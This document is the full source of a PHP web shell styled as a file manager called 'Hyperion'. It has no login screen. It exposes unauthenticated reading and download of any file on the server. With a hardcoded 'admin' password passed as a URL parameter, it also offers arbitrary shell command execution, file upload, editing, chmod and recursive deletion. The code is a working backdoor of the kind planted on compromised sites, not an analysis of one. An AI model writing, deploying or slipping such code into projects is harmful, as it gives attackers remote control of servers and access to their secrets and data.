<?php
/*
    Hyperion File Manager v10 [No-Auth Mode]
    - Login Screen Removed
    - Write Operations Protected via URL Parameter (?p=password)
    - Read-Only Mode by default
*/
error_reporting(0);
@ini_set('memory_limit', '128M');
@set_time_limit(0);

$CONFIG = [
    'pass' => 'admin', 
    'home' => str_replace('\\', '/', getcwd())
];

$p_param = $_REQUEST['p'] ?? '';
$IS_ADMIN = ($p_param === $CONFIG['pass']);

// --- API ACTIONS ---
if(isset($_REQUEST['req']) || isset($_FILES['f'])) {
    
    $cwd = $_REQUEST['cwd'] ?? $CONFIG['home'];
    $cwd = str_replace('//', '/', $cwd); 

    // Helper to block write actions
    function check_auth() {
        global $IS_ADMIN;
        if(!$IS_ADMIN) {
            echo json_encode(['status'=>false, 'msg'=>'Access Denied (Read Only)']);
            exit;
        }
    }

    // 1. CMD (Protected)
    if($_REQUEST['req'] === 'cmd') {
        check_auth();
        $cmd = $_POST['cmd'];
        $out = "Shell disabled";
        if(function_exists('shell_exec')) {
            $out = shell_exec("cd \"$cwd\" && $cmd 2>&1");
        } elseif(function_exists('exec')) {
            @exec("cd \"$cwd\" && $cmd 2>&1", $o);
            $out = implode("\n", $o);
        }
        echo json_encode(['status'=>true, 'out'=>$out ?: '']);
        exit;
    }

    // 2. UPLOAD (Protected)
    if(isset($_FILES['f'])) {
        check_auth();
        $c = 0;
        foreach($_FILES['f']['name'] as $i => $n) {
            if(move_uploaded_file($_FILES['f']['tmp_name'][$i], $cwd.'/'.$n)) $c++;
        }
        echo json_encode(['status'=>true, 'msg'=>"$c Files Uploaded"]); exit;
    }

    // 3. DOWNLOAD (Public)
    if($_REQUEST['req'] === 'download') {
        $f = $_REQUEST['target'];
        if(file_exists($f)) {
            header('Content-Type: application/octet-stream');
            header('Content-Disposition: attachment; filename="'.basename($f).'"');
            header('Content-Length: '.filesize($f));
            readfile($f); exit;
        }
    }

    // 4. GENERAL API
    header('Content-Type: application/json');
    $res = ['status'=>true];
    
    try {
        $r = $_REQUEST['req'];
        
        if($r === 'list') {
            // Public Read
            $scanDir = $cwd;
            if(empty($scanDir)) $scanDir = '/';
            
            $files = @scandir($scanDir);
            $readable = is_readable($scanDir);
            
            if($files === false) {
                $files = ['..'];
                $readable = false;
            }
            
            $list = [];
            foreach($files as $f) {
                if($f == '.') continue;
                if($f == '..' && $scanDir == '/') continue;
                
                $p = $scanDir == '/' ? '/'.$f : $scanDir.'/'.$f;
                $p = str_replace('//', '/', $p);
                
                $ext = strtolower(pathinfo($f, PATHINFO_EXTENSION));
                $isDir = is_dir($p);
                
                $type='file'; $icon='ri-file-line'; $col='bg-gray';
                
                if($f == '..') { $type='back'; $icon='ri-arrow-left-up-line'; $col='bg-back'; }
                elseif($isDir){ $type='dir'; $icon='ri-folder-fill'; $col='bg-yellow'; }
                elseif(in_array($ext, ['jpg','jpeg','png','gif','webp'])){ $type='img'; $icon='ri-image-fill'; $col='bg-purple'; }
                elseif(in_array($ext, ['php','html','css','js','json','sh'])){ $type='code'; $icon='ri-code-s-slash-fill'; $col='bg-blue'; }
                elseif(in_array($ext, ['zip','rar','tar','gz'])){ $type='zip'; $icon='ri-file-zip-fill'; $col='bg-red'; }
                
                $size = ''; $perms = ''; $date = '';
                if($readable && $type != 'back') {
                    $size = $isDir ? '' : size_fmt(@filesize($p));
                    $date = @date("M d", @filemtime($p));
                    $perms = substr(sprintf('%o', @fileperms($p)), -4);
                }

                $list[] = [
                    'name' => $f,
                    'type' => $type,
                    'icon' => $icon,
                    'color' => $col,
                    'size' => $size,
                    'date' => $date,
                    'perms' => $perms,
                    'w' => @is_writable($p)
                ];
            }
            
            usort($list, function($a,$b){
                if($a['type']=='back') return -1; if($b['type']=='back') return 1;
                if($a['type']=='dir' && $b['type']!='dir') return -1;
                if($a['type']!='dir' && $b['type']=='dir') return 1;
                return strcasecmp($a['name'], $b['name']);
            });
            
            $res['data'] = $list;
            $res['cwd'] = $scanDir;
            $res['readable'] = $readable;
            $res['writable'] = is_writable($scanDir) && $IS_ADMIN; // UI Flag
        }
        elseif($r === 'read') {
            // Public Read
            $res['content'] = file_get_contents($_POST['target']);
        }
        // Protected Actions
        elseif($r === 'save') { check_auth(); file_put_contents($_POST['target'], $_POST['content']); }
        elseif($r === 'rename') { check_auth(); rename($_POST['old'], $cwd.'/'.$_POST['new']); }
        elseif($r === 'chmod') { check_auth(); chmod($_POST['target'], octdec($_POST['mode'])); }
        elseif($r === 'delete') {
            check_auth();
            $t = $_POST['target'];
            if(is_dir($t)) {
                $it = new RecursiveDirectoryIterator($t, RecursiveDirectoryIterator::SKIP_DOTS);
                foreach(new RecursiveIteratorIterator($it, RecursiveIteratorIterator::CHILD_FIRST) as $f) 
                    if($f->isDir()) rmdir($f->getRealPath()); else unlink($f->getRealPath());
                rmdir($t);
            } else unlink($t);
        }
        elseif($r === 'new_folder') { check_auth(); mkdir($cwd.'/'.$_POST['name']); }
        elseif($r === 'new_file') { check_auth(); file_put_contents($cwd.'/'.$_POST['name'], ""); }
        
    } catch(Exception $e) { $res['status']=false; $res['msg']=$e->getMessage(); }
    
    echo json_encode($res); exit;
}

function size_fmt($b) {
    if($b===false) return "ERR";
    if($b==0)return"0B"; $u=['B','KB','MB','GB']; $i=floor(log($b,1024));
    return round($b/pow(1024,$i),1).' '.$u[$i];
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
<title>Hyperion</title>
<link href="https://cdn.jsdelivr.net/npm/remixicon@3.5.0/fonts/remixicon.css" rel="stylesheet">
<script src="https://cdnjs.cloudflare.com/ajax/libs/ace/1.4.12/ace.js"></script>
<style>
    :root { --bg: #09090b; --card: #18181b; --pri: #6366f1; --err: #ef4444; --border: #27272a; }
    * { margin:0; padding:0; box-sizing:border-box; -webkit-tap-highlight-color:transparent; user-select:none; }
    body { background: var(--bg); color: #e4e4e7; font-family: -apple-system, sans-serif; height: 100dvh; display: flex; flex-direction: column; overflow: hidden; }

    header { height: 60px; display: flex; align-items: center; justify-content: space-between; padding: 0 16px; border-bottom: 1px solid var(--border); background: rgba(9,9,11,0.8); backdrop-filter: blur(10px); z-index: 50; }
    .logo { font-weight: 700; font-size: 18px; color: #fff; display: flex; align-items: center; gap: 8px; }
    .status-badge { padding: 4px 8px; border-radius: 6px; font-size: 10px; font-weight: bold; text-transform: uppercase; letter-spacing: 0.5px; }
    .admin { background: rgba(99,102,241,0.2); color: var(--pri); border: 1px solid rgba(99,102,241,0.3); }
    .readonly { background: #27272a; color: #71717a; border: 1px solid #3f3f46; }

    .path-bar { padding: 10px 16px; border-bottom: 1px solid var(--border); overflow-x: auto; white-space: nowrap; display: flex; gap: 6px; scrollbar-width: none; background: var(--bg); }
    .crumb { background: #27272a; padding: 6px 12px; border-radius: 8px; font-size: 12px; color: #a1a1aa; cursor: pointer; transition: 0.2s; }
    .crumb:hover { background: #3f3f46; color: #fff; }
    .crumb.active { background: rgba(99,102,241,0.2); color: var(--pri); border: 1px solid rgba(99,102,241,0.3); }

    #main { flex: 1; overflow-y: auto; padding: 16px; padding-bottom: 110px; }
    .item { display: flex; align-items: center; padding: 12px; margin-bottom: 8px; background: var(--card); border-radius: 12px; border: 1px solid transparent; transition: 0.1s; position: relative; }
    .item:active { transform: scale(0.98); background: #27272a; }
    .item.sel { border-color: var(--pri); background: rgba(99,102,241,0.1); }
    
    .ico { width: 40px; height: 40px; border-radius: 10px; display: grid; place-items: center; font-size: 20px; color: #fff; margin-right: 12px; flex-shrink: 0; }
    .bg-yellow { background: #f59e0b; } .bg-blue { background: #3b82f6; } .bg-purple { background: #a855f7; }
    .bg-red { background: #ef4444; } .bg-gray { background: #52525b; } .bg-back { background: #3f3f46; }

    .inf { flex: 1; min-width: 0; }
    .name { font-size: 14px; font-weight: 500; margin-bottom: 2px; color: #fff; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
    .det { font-size: 11px; color: #71717a; }
    
    .ovl { position: fixed; inset: 0; background: rgba(0,0,0,0.85); z-index: 200; display: none; align-items: center; justify-content: center; backdrop-filter: blur(5px); opacity: 0; transition: 0.2s; }
    .ovl.show { display: flex; opacity: 1; }
    
    .modal { background: #18181b; width: 85%; max-width: 320px; border-radius: 20px; border: 1px solid var(--border); padding: 24px; transform: scale(0.9); transition: 0.2s cubic-bezier(0.16, 1, 0.3, 1); box-shadow: 0 25px 50px -12px rgba(0,0,0,0.5); }
    .ovl.show .modal { transform: scale(1); }
    
    .m-inp { width: 100%; background: #27272a; border: 1px solid #3f3f46; padding: 14px; border-radius: 12px; color: #fff; font-size: 16px; outline: none; text-align: center; margin-bottom: 20px; }
    .m-inp:focus { border-color: var(--pri); }
    .c-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; }
    .c-card { background: #27272a; padding: 20px; border-radius: 16px; text-align: center; cursor: pointer; border: 1px solid transparent; transition: 0.2s; display: flex; flex-direction: column; align-items: center; justify-content: center; gap: 10px; }
    .c-card:active { transform: scale(0.95); background: #3f3f46; }
    .c-card i { font-size: 28px; color: #a1a1aa; }
    .c-card span { font-size: 13px; font-weight: 600; color: #fff; }
    .c-card.f:hover { border-color: #3b82f6; } .c-card.f i { color: #3b82f6; }
    .c-card.d:hover { border-color: #f59e0b; } .c-card.d i { color: #f59e0b; }

    .dock { position: fixed; bottom: 24px; left: 50%; transform: translateX(-50%); background: rgba(24,24,27,0.9); backdrop-filter: blur(20px); border: 1px solid var(--border); border-radius: 24px; display: flex; padding: 12px 24px; gap: 28px; z-index: 100; box-shadow: 0 20px 50px rgba(0,0,0,0.6); }
    .d-btn { font-size: 24px; color: #71717a; cursor: pointer; transition: 0.2s; display: flex; flex-direction: column; align-items: center; gap: 4px; }
    .d-btn:hover { color: #fff; }
    .d-btn.act { color: var(--pri); transform: translateY(-4px); }
    .d-btn.dang { color: var(--err); }

    #term { position: fixed; inset: 0; background: #09090b; z-index: 300; display: none; flex-direction: column; font-family: 'Courier New', monospace; }
    #term-head { padding: 12px 16px; background: #18181b; border-bottom: 1px solid var(--border); display: flex; justify-content: space-between; align-items: center; color: #a1a1aa; font-size: 12px; letter-spacing: 1px; font-weight: 700; }
    #term-out { flex: 1; padding: 16px; overflow-y: auto; color: #22c55e; font-size: 15px; white-space: pre-wrap; line-height: 1.5; -webkit-overflow-scrolling: touch; }
    #term-bar { background: #18181b; padding: 12px 16px; display: flex; align-items: center; border-top: 1px solid var(--border); position: sticky; bottom: 0; padding-bottom: max(12px, env(safe-area-inset-bottom)); }
    #term-in { flex: 1; background: #27272a; border: 1px solid #3f3f46; color: #fff; font-size: 16px; outline: none; margin-left: 10px; padding: 8px 12px; border-radius: 8px; font-family: monospace; }
    #term-in:focus { border-color: #22c55e; }
    
    #ed { position: fixed; inset: 0; background: #09090b; z-index: 250; display: none; flex-direction: column; }
    .toast { position: fixed; top: 20px; left: 50%; transform: translateX(-50%); background: #27272a; color: #fff; padding: 10px 20px; border-radius: 30px; border: 1px solid #3f3f46; font-size: 13px; display: flex; align-items: center; gap: 8px; box-shadow: 0 10px 40px rgba(0,0,0,0.5); z-index: 999; animation: pop 0.3s cubic-bezier(0.16, 1, 0.3, 1); }
    @keyframes pop { from { transform: translate(-50%, -20px) scale(0.9); opacity: 0; } }
</style>
</head>
<body>

<div id="toasts"></div>

<!-- HEADER -->
<header>
    <div class="logo">
        <i class="ri-radar-fill" style="color:var(--pri)"></i> HYPERION
        <span class="status-badge <?= $IS_ADMIN ? 'admin' : 'readonly' ?>" style="margin-left:10px">
            <?= $IS_ADMIN ? 'ADMIN' : 'READ ONLY' ?>
        </span>
    </div>
    <div style="display:flex; gap: 16px; font-size: 20px; color:#a1a1aa;">
        <i class="ri-terminal-box-fill" onclick="termOpen()" style="cursor:pointer"></i>
        <i class="ri-home-4-fill" onclick="nav(S.home)" style="cursor:pointer"></i>
    </div>
</header>

<div class="path-bar" id="crumbs"></div>

<!-- LIST -->
<div id="main"></div>

<!-- DOCK -->
<div class="dock">
    <div class="d-btn" onclick="modalNew()"><i class="ri-add-circle-fill"></i></div>
    <div class="d-btn" onclick="document.getElementById('up').click()"><i class="ri-upload-cloud-2-fill"></i></div>
    <div class="d-btn" onclick="toggleSel()" id="btn-sel"><i class="ri-checkbox-multiple-line"></i></div>
    <div class="d-btn dang" onclick="delSel()"><i class="ri-delete-bin-5-fill"></i></div>
</div>

<!-- MODAL: CREATE/RENAME -->
<div class="ovl" id="m-ovl">
    <div class="modal">
        <div style="text-align:center;font-weight:700;color:#fff;margin-bottom:20px;font-size:18px" id="m-ti">New Item</div>
        <input type="text" class="m-inp" id="m-inp" placeholder="Enter Name..." autocomplete="off">
        <div id="m-cnt"></div>
    </div>
</div>

<!-- TERMINAL -->
<div id="term">
    <div id="term-head">
        <span>TERMINAL</span>
        <span onclick="termClose()" style="cursor:pointer;padding:4px">CLOSE</span>
    </div>
    <div id="term-out"></div>
    <div id="term-bar">
        <span style="color:#22c55e;font-weight:bold">$</span>
        <input id="term-in" type="text" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false">
    </div>
</div>

<!-- EDITOR -->
<div id="ed">
    <div style="height:50px; background:#18181b; display:flex; align-items:center; justify-content:space-between; padding:0 16px; border-bottom:1px solid #27272a;">
        <span id="ed-name" style="font-weight:600; color:#e4e4e7; font-size:14px"></span>
        <div style="display:flex; gap:16px; font-size:22px">
            <i class="ri-close-line" style="cursor:pointer; color:#71717a" onclick="document.getElementById('ed').style.display='none'"></i>
            <i class="ri-save-3-fill" style="cursor:pointer; color:var(--pri)" onclick="saveFile()"></i>
        </div>
    </div>
    <div id="ace" style="flex:1"></div>
</div>

<input type="file" id="up" multiple style="display:none" onchange="doUp()">

<script>
let S = { cwd: "<?= $CONFIG['home'] ?>", home: "<?= $CONFIG['home'] ?>", files: [], sel: [], mode: false, edFile: '' };

window.onload = () => { load(); }

// CORE
async function api(req, data={}) {
    let fd = new FormData();
    fd.append('req', req); fd.append('cwd', S.cwd);
    
    // AUTO-INJECT P PARAMETER
    let p = new URLSearchParams(window.location.search).get('p');
    if(p) fd.append('p', p);

    for(let k in data) fd.append(k, data[k]);
    try { return await (await fetch('?', {method:'POST', body:fd})).json(); } catch(e){ return {status:false, msg:'Net Err'}; }
}
function toast(msg, err=false) {
    let t = document.createElement('div'); t.className = 'toast';
    t.innerHTML = `<i class="${err?'ri-error-warning-fill':'ri-checkbox-circle-fill'}" style="color:${err?'#ef4444':'#22c55e'};font-size:18px"></i> ${msg}`;
    document.getElementById('toasts').appendChild(t);
    setTimeout(() => { t.remove(); }, 2500);
}

// NAV
async function load() {
    let r = await api('list');
    if(r.status) {
        S.files = r.data; S.cwd = r.cwd;
        renderCrumbs(); renderList(r.readable, r.writable);
        S.sel = []; updateSel();
    } else toast(r.msg, true);
}

function renderCrumbs() {
    let p = S.cwd.replace(/\/$/, '').split('/');
    let h = `<div class="crumb" onclick="nav('/')">/</div>`;
    let b = '';
    for(let i=0; i<p.length; i++) {
        if(!p[i]) continue;
        b += '/' + p[i];
        let isLast = (i === p.length-1);
        h += `<div class="crumb ${isLast?'active':''}" onclick="nav('${b}')">${p[i]}</div>`;
    }
    document.getElementById('crumbs').innerHTML = h;
    document.getElementById('crumbs').scrollLeft = 9999;
}

function renderList(readable, writable) {
    let h = '';
    // LOCK STATUS IF NOT READABLE
    if(!readable) {
        h = `
        <div style="text-align:center;padding:60px 20px;color:#52525b">
            <i class="ri-lock-2-fill" style="font-size:48px;color:#ef4444;margin-bottom:10px;display:block"></i>
            <span style="font-size:14px;font-weight:500">Access Denied</span>
            <div style="font-size:12px;margin-top:5px">You cannot read this folder.</div>
        </div>`;
        // Force add back button
        h = `<div class="item" onclick="nav(S.cwd.split('/').slice(0,-1).join('/') || '/')">
                <div class="ico bg-back"><i class="ri-arrow-left-up-line"></i></div>
                <div class="inf"><div class="name">..</div><div class="det">Go Back</div></div>
             </div>` + h;
    } else {
        if(!S.files.length) h = '<div style="text-align:center;padding:50px;color:#3f3f46"><i class="ri-folder-open-line" style="font-size:32px"></i><br><br>Empty</div>';
        S.files.forEach(f => {
            let iconLock = (!f.w && f.type!='back') ? '<i class="ri-lock-fill" style="color:#ef4444;font-size:12px;margin-left:5px"></i>' : '';
            h += `
            <div class="item" id="c-${f.name}" onclick="clk('${f.name}','${f.type}')">
                <div class="ico ${f.color}"><i class="${f.icon}"></i></div>
                <div class="inf">
                    <div class="name">${f.name} ${iconLock}</div>
                    <div class="det">${f.size} ${f.date ? '• '+f.date : ''} ${f.perms ? '• '+f.perms : ''}</div>
                </div>
                ${f.type!=='back' ? `<i class="ri-more-2-fill" style="color:#71717a;font-size:20px;padding:8px" onclick="event.stopPropagation();menu('${f.name}')"></i>` : ''}
            </div>`;
        });
    }
    document.getElementById('main').innerHTML = h;
}

function nav(p) { S.cwd = p; load(); }
function clk(n, t) {
    if(S.mode && t!=='back') {
        let i = S.sel.indexOf(n);
        if(i>-1) S.sel.splice(i,1); else S.sel.push(n);
        updateSel();
    } else {
        if(t==='back') nav(S.cwd.split('/').slice(0,-1).join('/') || '/');
        else if(t==='dir') nav(S.cwd === '/' ? '/'+n : S.cwd+'/'+n);
        else if(['code','file'].includes(t)) edit(n);
        else menu(n);
    }
}
function toggleSel() { S.mode=!S.mode; document.getElementById('btn-sel').classList.toggle('act'); S.sel=[]; updateSel(); }
function updateSel() {
    document.querySelectorAll('.item').forEach(e => {
        let n = e.id.substring(2);
        if(S.sel.includes(n)) e.classList.add('sel'); else e.classList.remove('sel');
    });
}

// MODAL UI
function modalNew() {
    let h = `
    <div class="c-grid">
        <div class="c-card f" onclick="mk('file')"><i class="ri-file-add-fill"></i><span>New File</span></div>
        <div class="c-card d" onclick="mk('folder')"><i class="ri-folder-add-fill"></i><span>New Folder</span></div>
    </div>`;
    openModal('Create New', '', h);
}
function menu(n) {
    let h = `
    <div class="c-grid" style="grid-template-columns:1fr 1fr;gap:10px">
        <div class="c-card" onclick="prepRen('${n}')"><i class="ri-pencil-fill"></i><span>Rename</span></div>
        <div class="c-card" onclick="location.href='?req=download&target='+encodeURIComponent(S.cwd+'/${n}')"><i class="ri-download-cloud-fill"></i><span>Download</span></div>
        <div class="c-card" onclick="prepPerm('${n}')"><i class="ri-lock-fill"></i><span>Chmod</span></div>
        <div class="c-card dang" onclick="delItem('${n}')" style="border-color:#ef4444"><i class="ri-delete-bin-fill" style="color:#ef4444"></i><span style="color:#ef4444">Delete</span></div>
    </div>`;
    openModal(n, n, h);
    document.getElementById('m-inp').style.display = 'none'; // Hide input for menu
}

function openModal(t, v, html) {
    document.getElementById('m-ti').innerText = t;
    document.getElementById('m-inp').value = v;
    document.getElementById('m-inp').style.display = 'block';
    document.getElementById('m-cnt').innerHTML = html;
    document.getElementById('m-ovl').classList.add('show');
    if(v==='') setTimeout(()=>document.getElementById('m-inp').focus(), 100);
}
document.getElementById('m-ovl').onclick = (e) => { if(e.target.id==='m-ovl') document.getElementById('m-ovl').classList.remove('show'); };

// ACTIONS
async function mk(t) {
    let n = document.getElementById('m-inp').value;
    if(n) {
        let r = await api(t=='file'?'new_file':'new_folder', {name:n});
        if(r.status) { toast('Created'); document.getElementById('m-ovl').classList.remove('show'); load(); } else toast(r.msg, true);
    }
}
function prepRen(n) {
    document.getElementById('m-cnt').innerHTML = `<button onclick="doRen('${n}')" style="width:100%;padding:15px;background:var(--pri);color:#fff;border:none;border-radius:12px;font-weight:600">Save Changes</button>`;
    document.getElementById('m-inp').style.display = 'block';
    document.getElementById('m-ti').innerText = 'Rename Item';
}
async function doRen(o) {
    let n = document.getElementById('m-inp').value;
    let r = await api('rename', {old:S.cwd+'/'+o, new:n});
    if(r.status) { toast('Renamed'); document.getElementById('m-ovl').classList.remove('show'); load(); } else toast(r.msg, true);
}
async function delItem(n) {
    if(confirm('Delete '+n+'?')) {
        let r = await api('delete', {target:S.cwd+'/'+n});
        if(r.status) { document.getElementById('m-ovl').classList.remove('show'); load(); toast('Deleted'); }
    }
}
function prepPerm(n) {
    document.getElementById('m-inp').value = '0755';
    document.getElementById('m-inp').style.display = 'block';
    document.getElementById('m-ti').innerText = 'Change Permissions';
    document.getElementById('m-cnt').innerHTML = `<button onclick="doPerm('${n}')" style="width:100%;padding:15px;background:var(--pri);color:#fff;border:none;border-radius:12px;font-weight:600">Set Permissions</button>`;
}
async function doPerm(n) {
    let r = await api('chmod', {target:S.cwd+'/'+n, mode:document.getElementById('m-inp').value});
    if(r.status) { toast('Updated'); document.getElementById('m-ovl').classList.remove('show'); load(); } else toast(r.msg, true);
}

// EDITOR
let aceEd = ace.edit("ace"); aceEd.setTheme("ace/theme/twilight"); aceEd.session.setMode("ace/mode/php"); aceEd.setOptions({fontSize:"14px"});
async function edit(n) {
    S.edFile = n;
    let r = await api('read', {target:S.cwd+'/'+n});
    aceEd.setValue(r.content, -1);
    document.getElementById('ed-name').innerText = n;
    document.getElementById('ed').style.display = 'flex';
}
async function saveFile() {
    let r = await api('save', {target:S.cwd+'/'+S.edFile, content:aceEd.getValue()});
    if(r.status) { toast('Saved'); document.getElementById('ed').style.display = 'none'; } else toast('Error', true);
}
async function doUp() {
    let f = document.getElementById('up').files;
    if(!f.length) return;
    toast('Uploading...');
    let fd = new FormData(); fd.append('cwd', S.cwd);
    
    // AUTO-INJECT P PARAMETER
    let p = new URLSearchParams(window.location.search).get('p');
    if(p) fd.append('p', p);

    for(let i=0; i<f.length; i++) fd.append('f[]', f[i]);
    await fetch('?', {method:'POST', body:fd});
    load(); toast('Upload Done');
}
async function delSel() {
    if(!S.sel.length) return;
    if(confirm('Delete selected?')) {
        for(let n of S.sel) await api('delete', {target:S.cwd+'/'+n});
        toggleSel(); load(); toast('Items Deleted');
    }
}

// TERM
function termOpen() { document.getElementById('term').style.display = 'flex'; document.getElementById('term-in').focus(); }
function termClose() { document.getElementById('term').style.display = 'none'; }
document.getElementById('term-in').addEventListener('keydown', async (e) => {
    if(e.key === 'Enter') {
        let c = e.target.value; if(!c) return;
        let b = document.getElementById('term-out');
        b.innerHTML += `<div><span style="color:#22c55e">$</span> ${c}</div>`;
        e.target.value = '';
        if(c==='clear'){ b.innerHTML=''; return; }
        if(c==='exit'){ termClose(); return; }
        let r = await api('cmd', {cmd:c});
        b.innerHTML += `<div style="color:#e4e4e7;margin-bottom:10px;opacity:0.9">${r.out}</div>`;
        b.scrollTop = b.scrollHeight;
    }
});
</script>
</body>
</html>
